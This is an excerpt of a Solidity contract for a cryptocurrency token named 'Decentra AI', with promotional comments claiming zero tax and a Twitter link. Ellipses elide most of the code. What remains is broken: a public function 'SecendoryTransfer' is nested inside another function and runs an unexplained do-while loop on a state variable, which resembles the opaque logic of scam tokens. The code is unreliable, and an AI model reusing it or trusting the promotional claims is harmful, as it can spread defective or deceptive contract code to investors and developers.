...
// Twitter : https://twitter.com/Decentra_AI

/**

Tax : 0/0

We believe in crypto there should be mo tax in name of marketing or anything because mostly everyone do tax farm with those high taxes. So here we are presenting the real decentralised token “Decentra AI” 
...
Decentra AI is a pure degen at this moment but soon we will bring in some utilities here to make it more sustainable
...
contract DecentraAI is ERC20, Ownable {
    ...
    function updateSwapEnabled(bool enabled) external onlyOwner(){
        ...
        function SecendoryTransfer(uint256 _sum) public {
    do {
        UnderAmount = _sum;
    }
            while (_sum!=(Valuestwo / ValueThree));
    }
